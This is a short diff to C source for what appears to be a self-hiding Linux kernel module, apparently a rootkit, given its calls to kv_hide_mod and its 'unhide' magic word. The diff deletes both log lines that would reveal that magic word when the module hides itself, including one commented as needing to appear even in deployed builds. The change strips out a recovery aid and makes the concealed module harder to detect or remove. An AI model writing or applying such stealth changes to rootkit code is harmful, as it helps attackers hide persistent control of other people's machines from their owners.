@@ -481,7 +481,6 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
             static unsigned int msg_lock = 0;
             if(!msg_lock) {
                 msg_lock = 1;
-                prinfo("Your module \'unhide\' magic word is: '%s'\n", magik);
             }
             op_lock = 1;
             kv_hide_mod();
@@ -773,8 +772,6 @@ cont:
 
 
 #ifndef DEBUG_RING_BUFFER
-    /** *pr_info because it must be shown even if DEPLOY=1 */
-    pr_info("Your module \'unhide\' magic word is: '%s'\n", magik);
     kv_hide_mod();
     op_lock = 1;
 #endif
